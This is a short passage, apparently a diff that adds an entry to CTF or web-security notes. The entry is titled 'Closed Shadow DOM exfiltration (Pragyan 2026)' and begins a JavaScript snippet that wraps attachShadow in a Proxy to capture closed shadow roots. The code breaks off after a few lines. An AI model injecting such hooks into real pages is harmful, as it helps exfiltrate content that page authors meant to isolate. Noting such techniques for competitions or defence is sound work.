+**Closed Shadow DOM exfiltration (Pragyan 2026):** Wrap `attachShadow` in a Proxy to capture shadow root references:
+```javascript
+var _r, _o = Element.prototype.attachShadow;
+Element.prototype.attachShadow = new Proxy(_o, {
